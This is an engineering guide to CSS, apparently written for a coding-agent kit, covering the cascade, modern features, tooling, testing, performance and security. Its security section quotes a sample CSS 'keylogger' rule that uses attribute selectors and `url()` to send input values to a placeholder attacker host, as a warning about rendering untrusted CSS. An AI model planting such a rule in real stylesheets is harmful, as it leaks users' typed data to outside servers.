# CSS — engineering guide
> Last verified: 2026-09-28 — Baseline dates below confirmed against each feature's MDN "Baseline: widely/newly available since <date>" banner: `@layer` (Mar 2022), logical properties e.g. `margin-inline` (Apr 2021), `clamp()` (Jul 2020), `@container` (Feb 2023), `:has()` (Dec 2023), CSS nesting `&` (Dec 2023), `color-mix()`/`oklch()` (May 2023), `light-dark()` (newly available, since May 2024), `content-visibility` (newly available, since Sep 2024). stylelint at v17 via its own get-started docs. Also re-checked against MDN/OWASP: `@layer` override direction (§3), `container-type: inline-size` containment set (§3), clickjacking as current not legacy (§7). Re-verify any specific date before repeating it in 2027+; "widely available" ages into safety, "newly available" doesn't yet have it.
> Scope: writing, reviewing, and reviewing performance/accessibility of CSS (plain CSS, Sass/SCSS, Less, PostCSS) across any framework. Quick card: `.agents/rules/lang-css.md` · principles: `.agents/guides/principles/simplicity.md`, `.agents/guides/principles/performance.md`, `.agents/guides/principles/accessibility.md`. Tailwind utility-class conventions live in `.agents/guides/frameworks/tailwind.md` (not duplicated here — this guide covers hand-written CSS, which a Tailwind project still has some of: `src/app.css`, `@theme`, third-party overrides).

## 1. Mental model / philosophy
CSS is a **declarative constraint language over a cascade**, not a sequence of statements. Three ideas explain almost every CSS bug a weak model produces:

- **The cascade decides which of several matching declarations wins**, in this order: origin/importance (user `!important` > author `!important` > author normal > user-agent default) → `@layer` order (unlayered author CSS wins over any layered CSS) → specificity (inline > ID > class/attribute/pseudo-class > element/pseudo-element) → source order (last wins a tie). Most "CSS doesn't work" reports are the cascade doing exactly what it's told, in an order the author didn't intend. `!important` and ID selectors are usually a **symptom** of not understanding this order, not a fix — reach for `@layer` (source-independent precedence) instead.
- **The box model and layout are space negotiations**, not a stream of instructions. `display` (flow, flex, grid, none…), `position`, and the box model (content/padding/border/margin, `box-sizing`) determine how an element claims and shares space with siblings and ancestors. Getting a layout "unstuck" means finding which container's mode/constraints produce the space, not adding overrides to the child.
- **CSS fails silently by design.** An unknown property, invalid value, or unsupported selector is simply *ignored* — no error, no console warning. This is why a linter (§2) and `@supports` fallbacks (§4, §9) matter more here than in most languages: nothing else tells you a declaration did nothing.

**Preprocessor or native CSS?** Sass/Less exist mainly for variables, nesting, and mixins/loops vanilla CSS lacked. Custom properties (`--x`) now cover variables (runtime-reactive, unlike Sass variables) and native nesting (§3) covers most nesting needs. Prefer plain CSS with custom properties and `@layer` for anything new; keep a preprocessor only where the project already depends on a feature CSS still lacks — check `package.json`/the build config first.

## 2. Project structure & tooling
```text
src/app.css            # a SolidStart/Vite-style single global entry (reference setup's shape)
src/**/*.module.css     # CSS Modules (framework-scoped class names) — check the build for this pattern
styles/tokens.css       # design tokens as custom properties, if centralized
stylelint.config.mjs    # stylelint v17 config (ESM, default export)
.browserslistrc / "browserslist" in package.json   # target matrix other tools (autoprefixer, Baseline checks) read
```
**Reference setup (SolidStart 2 + Tailwind 4 project, verified 2026-09)**: Tailwind CSS v4 via `@tailwindcss/vite`, `@import "tailwindcss";` at the top of `src/app.css`, **no `tailwind.config.*`** — theme customization is CSS `@theme` in `src/app.css` itself. In such a project, new custom CSS goes in `src/app.css` (or a colocated `*.module.css` if the project adopts one) and coexists with Tailwind utilities — don't hand-roll a utility Tailwind already provides (`.agents/rules/fw-tailwind.md`, `.agents/rules/lang-css.md` invariant 8).

**Lint** (verify the project's own pinned version in `package.json` first — this section assumes stylelint v17, confirmed current):
```js
// stylelint.config.mjs
export default {
  extends: ['stylelint-config-standard'],       // + 'stylelint-config-standard-scss' for .scss, '-less' for .less
  rules: {
    'custom-property-pattern': null,             // relax if the project's tokens don't follow kebab-case
    'at-rule-no-unknown': [true, { ignoreAtRules: ['tailwind', 'apply', 'theme', 'layer', 'plugin', 'custom-variant', 'variant', 'reference', 'config', 'utility', 'source', 'slot'] }],
  },
};
```
The `ignoreAtRules` list exists because plain stylelint doesn't know Tailwind's at-rules (`@theme`, `@apply`, …) and flags every one — check for a maintained `stylelint-config-tailwindcss`-style package first; extend it instead of hand-listing if the project has one.
```bash
npx stylelint "**/*.css"            # check
npx stylelint "**/*.css" --fix      # autofixable rules only
```
**Format**: Prettier and recent Biome both have CSS support of varying maturity — check `biome.json`/`.prettierrc*` for whether CSS is actually enabled before assuming a formatter runs on save; otherwise match existing style by hand.
**Verify**: no CSS-specific stack exists in this kit's `verify.mjs` — wire `stylelint` into the project's `lint` script so `node .agents/scripts/verify.mjs --only node` covers it; otherwise run `stylelint` directly and note that in your Worker Report.

## 3. Core idioms
**Cascade layers** give you a second, source-order-independent axis of precedence — declare the layer order once, then any file can add to any layer in any order:
```css
@layer reset, base, components, utilities;   /* declared order = precedence order, low to high */
@layer components {
  .card { padding: 1rem; border-radius: .5rem; }
}
/* loaded later, even in a later <link>, but still loses to .components: unlayered CSS
   always wins over every layer — the opposite of what source order alone would say */
```
To override unlayered third-party CSS without `!important`, apply that rule in reverse: import the third-party sheet into its own layer (`@import "vendor.css" layer(vendor);`) and leave your own overriding rules unlayered — unlayered always wins, so the override applies with no specificity fight. Wrapping your *own* CSS in layers instead does the opposite: it only orders precedence among your own rules, so you'd then lose to the still-unlayered third party.

**Native nesting** (Baseline: widely available since Dec 2023) compiles to real flat selectors — the browser parses it directly, no build step required:
```css
.card {
  padding: 1rem;
  & .title { font-weight: 600; }      /* -> .card .title { ... } (descendant) */
  &:hover { box-shadow: 0 2px 8px rgb(0 0 0 / .1); }   /* -> .card:hover */
  &.is-featured { border-color: var(--color-brand); }  /* -> .card.is-featured (compound, needs &) */
}
```
A bare nested rule without `&` (`.card { :hover { } }`) is legal but rarely what you meant — it nests as a descendant combinator, not compound.

**`:has()`** (Baseline: widely available since Dec 2023) is the first native parent/relational selector:
```css
/* style a form group only when its own input is invalid — no JS class toggling needed */
.form-group:has(input:invalid) { border-color: var(--color-danger); }
/* a card layout that only applies a grid when it actually has an image child */
.card:has(> img) { grid-template-columns: auto 1fr; }
```

**Container queries** (Baseline: widely available since Feb 2023) respond to the containing element's size, not the viewport — essential for a component reused at different widths:
```css
.sidebar { container-type: inline-size; container-name: sidebar; }
@container sidebar (min-width: 20rem) {
  .card { grid-template-columns: auto 1fr; }
}
```
`container-type: inline-size` also creates a new containment context (implies layout, style, and inline-size containment — style/inline-size containment scope counters and quotes to the element too, not just layout), so measure any perf-sensitive reflow before applying it broadly.

**Logical properties** (Baseline: widely available since Apr 2021) express direction relative to writing mode instead of physical sides — write once, correct in both LTR and RTL:
```css
.card { margin-inline: auto; padding-block: 1rem; border-inline-start: 3px solid var(--color-brand); }
/* NOT: margin-left/margin-right, padding-top/padding-bottom, border-left — those ignore dir="rtl" */
```

**Fluid values with `clamp()`** (Baseline: widely available since Jul 2020) replace a breakpoint ladder for values that should just scale:
```css
h1 { font-size: clamp(1.75rem, 1.4rem + 1.5vw, 3rem); }   /* min, preferred (viewport-relative), max */
.container { padding-inline: clamp(1rem, 4vw, 3rem); }
```
Pick the "preferred" term so it crosses from min to max across the viewport range you actually support — a flat `vw` term with no `rem` base won't respect the user's font-size zoom.

**Color: `color-mix()` and `oklch()`** (Baseline: widely available since May 2023) derive palette variations from one source token instead of hand-picked hex values that drift:
```css
:root { --color-brand: oklch(62% 0.19 259); }
.button:hover { background: color-mix(in oklch, var(--color-brand) 85%, black); }
.button:disabled { background: color-mix(in oklch, var(--color-brand) 40%, white); }
```
`oklch()` is perceptually uniform (equal lightness steps look equally different to the eye, unlike HSL), which is why palette-generation tools and `color-mix()` recipes increasingly use it as the mixing space (`in oklch`).

**`light-dark()`** (Baseline: **newly available**, since May 2024 — verify current browser support before relying on it as the only theming mechanism) replaces a full duplicated dark-mode rule:
```css
:root { color-scheme: light dark; }   /* required — light-dark() reads this */
body { background: light-dark(#fff, #1a1a1a); color: light-dark(#111, #eee); }
```
Still support a plain `@media (prefers-color-scheme: dark) { ... }` fallback block if the project's browser matrix isn't confirmed to cover it.

**Custom properties as design tokens**: define once at a scope, consume everywhere under it; a component overriding a token only affects its own subtree:
```css
:root { --space-2: 0.5rem; --space-4: 1rem; --radius-md: 0.5rem; }
.card { padding: var(--space-4); border-radius: var(--radius-md); }
.card--compact { --space-4: var(--space-2); }  /* overrides just within this subtree */
```

## 4. Error handling
CSS has no exceptions — every failure mode is **silent**, so "error handling" here means building in visibility and fallbacks instead of catching anything:
- **Lint catches what the browser won't tell you.** A typo'd property (`colour:`), an invalid value, or an unsupported selector parses as "ignored," not "error" — `stylelint` is the only thing that will flag it before a user notices a missing style.
- **`@supports` for feature detection**, checked *before* using a feature you're not sure is safe for the project's browser matrix:
```css
@supports (color: oklch(0% 0 0)) {
  .button { background: oklch(62% 0.19 259); }
}
@supports not (color: oklch(0% 0 0)) {
  .button { background: #3b5bdb; }   /* fallback for the small remaining gap */
}
```
Declaration order also gives a free fallback with no `@supports` block at all — the browser uses the *last* declaration for a property it understands, so put the modern value last:
```css
.button { background: #3b5bdb; background: oklch(62% 0.19 259); }
```
- **`var()`'s second argument is a fallback**, used only when the custom property is unset, not when it's invalid — `background: var(--color-brand, #3b5bdb);`. A property that resolves to an invalid value still falls back to its own initial/inherited value, silently.
- **A PostCSS/Sass build failure is a real, loud build error** (unlike runtime CSS) — treat it like any other toolchain failure: read the actual compiler message, don't guess at the syntax.

## 5. Testing
CSS has no unit-testable "logic"; testing means **visual and behavioral verification**, not assertions on values:
- **Linting is the fast, deterministic layer** — `stylelint` catches invalid syntax and disallowed patterns before anything renders.
- **Visual regression** for layout/appearance-sensitive changes: Playwright's `expect(page).toHaveScreenshot()` (if the project uses Playwright; see root `AGENTS.md`) against key breakpoints; a dedicated tool (Chromatic, BackstopJS, Percy) only if the project already uses one.
- **Emulate the media features you style for**: `await page.emulateMedia({ colorScheme: 'dark' })`, `{ reducedMotion: 'reduce' }`.
- **Responsive/container-query breakpoints**: resize the viewport (`page.setViewportSize`), or the container's own box for a `@container` query (resize an ancestor, not the viewport), and assert the layout.
- **Accessibility**: `axe-core`/`@axe-core/playwright` catches contrast and focus-visibility regressions that are CSS-caused as often as markup-caused (`.agents/rules/topic-accessibility.md`).
- Don't assert on generated class names or exact computed style strings unrelated to the behavior under test — breaks on any equivalent refactor.

## 6. Performance
**Critical rendering path**: a `<link rel="stylesheet">` blocks first paint until it downloads and parses — minimize what's on that path. `@import` inside a stylesheet is worse: it's fetched only after the importing sheet starts parsing, serializing a request that could have been parallel `<link>` tags.
```html
<!-- Non-blocking pattern for a non-critical stylesheet (e.g. print, or below-fold) -->
<link rel="stylesheet" href="print.css" media="print">
<link rel="preload" href="feature.css" as="style" onload="this.rel='stylesheet'">
```
**Selector cost is rarely the bottleneck** — modern engines match fast; a deeply nested/overqualified selector (`div.page > ul.list li.item a.link`) is a maintainability problem (fragile, hard to override) more than a runtime one. Optimize for readability and low specificity first.

**Animate compositor-only properties.** `transform`/`opacity` run on the compositor thread without layout or paint; `width`/`height`/`top`/`left`/`margin`/`box-shadow` force layout and/or paint every frame. Use `will-change: transform` only while an animation runs (toggle via JS/a class) — leaving it on permanently keeps an extra composited layer around, costing memory.

**`content-visibility: auto`** (Baseline: **newly available** since Sep 2024 — check the project's matrix) skips layout/paint work for off-screen content, a major win for long pages:
```css
.comment { content-visibility: auto; contain-intrinsic-size: auto 120px; }
```
`contain-intrinsic-size` matters — without a size estimate, scrollbar length jumps as content scrolls into view. Plain `contain: layout paint` tells the browser a subtree's layout/paint can't affect anything outside it, without hiding content the way `content-visibility` does — apply to independent widgets/cards, not something whose size must respond to its content.

**Avoid layout shift (CLS)**: reserve space with `aspect-ratio`/explicit `width`+`height` for images, `min-height` for async content, and load web fonts with `font-display: swap`/`optional` plus a close-matching fallback (a big font-metric mismatch causes its own shift on swap).

**Ship less CSS**: with Tailwind, only classes actually used in scanned source end up in the build — don't fight that by string-concatenating class names at runtime in a way the scanner can't see (`` `text-${color}-500` `` needs the literal classes present statically). For hand-written CSS, avoid duplicating a utility framework's worth of one-off classes; prefer a small token set (§3).

## 7. Security
- **CSS side-channel data exfiltration ("CSS keylogger")**: per-character attribute selectors (`input[value^="a"] { background: url(https://evil/log?a); }`) can read live attribute values, wherever the page renders **untrusted, user-authored CSS** (a theme editor, a "custom CSS" field, a multi-tenant widget). Sanitize it with an allowlist-based sanitizer (not a hand-rolled regex denylist) before rendering.
- **`url()` fetches resources** — a background-image or `@font-face` `src` pointing at attacker-controlled input can exfiltrate data or probe internal endpoints from a trusted origin. Validate/allowlist any user-influenced `url()` like a redirect target.
- **`style-src` in Content-Security-Policy** commonly disallows inline `<style>`/`style=""` — a boundary, not an accident. Don't reach for `unsafe-inline` to fix a "styles aren't applying" bug; use a nonce/hash the project's CSP already issues, or an external stylesheet.
- **`expression()`** (old IE dynamic CSS) is a legacy concern only. **Clickjacking** (a transparent overlaid frame tricks a click on your page's controls) is, by contrast, current on any evergreen browser unless the server opts out — send `Content-Security-Policy: frame-ancestors 'none'` (or an allowlist) on any response that must never be framed; `X-Frame-Options: DENY` only as an older-browser fallback.
- **No secrets in CSS.** A `url()`/custom property is not a safe place for an API key or token — CSS ships to every client, cacheable and publicly readable.

## 8. Concurrency / rendering pipeline
CSS has no concurrency model of its own — the analogous concern is **how stylesheets interact with the browser's parse/render pipeline**:
- **CSSOM construction blocks first render** — the browser can't paint until it has both the DOM and parsed CSSOM, so every render-blocking stylesheet adds latency; keep that set small (§6) and load non-critical CSS asynchronously.
- **`@media`-gated `<link>` tags don't block rendering for non-matching media** — `media="print"` downloads at low priority and never blocks screen rendering, a cheap way to defer a whole sheet.
- **The compositor thread runs independently of the main thread** — `transform`/`opacity` animations (§6) stay smooth even while the main thread is busy with JS.
- **`@starting-style`** (verify Baseline/caniuse first) lets a newly-inserted or `display: none → block` element transition in without a JS two-step class toggle.

## 9. Anti-patterns → fixes
| Anti-pattern | Why it hurts | Fix |
|---|---|---|
| `!important` / ID selector to win a fight | Escalates the next override; hides real specificity | Lower specificity, or `@layer` for order-independent precedence (§3) |
| Animating `width`/`height`/`top`/`left`/`margin` | Forces layout every frame, drops to <60fps | Animate `transform`/`opacity` only (§6) |
| No reserved space for late-loading content | Cumulative Layout Shift | `aspect-ratio`/explicit dimensions/`min-height` (§6) |
| Ignoring `prefers-reduced-motion` | Users who opted out still get animation | Gate non-essential motion behind the media query |
| Raw `px` for spacing/type, physical `left`/`right` | Ignores font-size zoom; breaks in RTL | `rem`/logical properties (`margin-inline`, `inset`) (§3) |
| Unscoped custom property / generic class name | Silent collision across unrelated components | Prefix tokens; scope to the component root (§3) |
| Deeply nested/overqualified selector | Fragile, hard to override | Flat, low-specificity selectors; nesting for organization only |
| `@import` chains in CSS | Serializes fetches instead of parallel `<link>`s | Separate `<link>` tags, or a bundler that inlines imports |
| Rendering untrusted user CSS unsanitized | CSS-based data exfiltration (attribute-selector keylogger) | Allowlist-based CSS sanitizer, never verbatim render |
| Assuming a recent feature works everywhere | Silent no-op in older/unsupported browsers | Check Baseline/caniuse against the project's matrix; `@supports` fallback (§4) |
| Hand-writing a rule Tailwind's utilities already cover | Duplicated, drifting styling | Compose existing utilities/`@theme` tokens first (`.agents/rules/lang-css.md` invariant 8) |

## 10. Review checklist
- [ ] No new `!important`/ID selector to win a cascade fight; `@layer` used where precedence needs to be source-order-independent.
- [ ] Transitions/animations touch only `transform`/`opacity`, gated behind `@media (prefers-reduced-motion: ...)`.
- [ ] Anything loading late (image, font, async content) has reserved space — no avoidable layout shift.
- [ ] Spacing/type use `rem`/`em`/logical properties, not hardcoded `px` and physical `left`/`right`/`top`/`bottom` throughout.
- [ ] Custom properties and class names are scoped/prefixed; no accidental global token collision.
- [ ] Any recent feature (nesting, `:has()`, container queries, `light-dark()`, `content-visibility`) checked against Baseline/caniuse for this project's browsers, with a `@supports` fallback if not yet widely available.
- [ ] If user-authored/untrusted CSS is ever rendered, it goes through an allowlist sanitizer, not verbatim.
- [ ] `stylelint` reports clean; the formatter ran only if the project actually configures it for CSS.
- [ ] If Tailwind applies: no hand-written rule duplicates an existing utility or `@theme` token.
- [ ] A visual/behavioral check covers the changed breakpoints/color-scheme/reduced-motion states, not just "it compiles."

## 11. References
- MDN CSS https://developer.mozilla.org/en-US/docs/Web/CSS · Cascade /Web/CSS/Cascade · Specificity /Web/CSS/Specificity
- `@layer` /Web/CSS/@layer · Nesting /Web/CSS/Guides/Nesting · `:has()` /Web/CSS/:has (all under developer.mozilla.org/en-US/docs)
- Container queries /Web/CSS/CSS_container_queries · Logical properties /Web/CSS/CSS_logical_properties_and_values
- `clamp()` /Web/CSS/clamp · `color-mix()` /Web/CSS/color_value/color-mix · `oklch()` /Web/CSS/color_value/oklch · `light-dark()` /Web/CSS/color_value/light-dark
- `content-visibility` /Web/CSS/content-visibility · Containment /Web/CSS/CSS_containment
- Baseline https://web.dev/baseline · caniuse https://caniuse.com · stylelint https://stylelint.io/user-guide/get-started
- Tailwind CSS v4 https://tailwindcss.com/docs (theme via `@theme`, no `tailwind.config.*`) — verify version against the project's `package.json`
- OWASP Clickjacking https://community.owasp.org/attacks/Clickjacking · CSS injection/exfiltration https://owasp.org/www-community/attacks/ · CLS https://web.dev/articles/cls
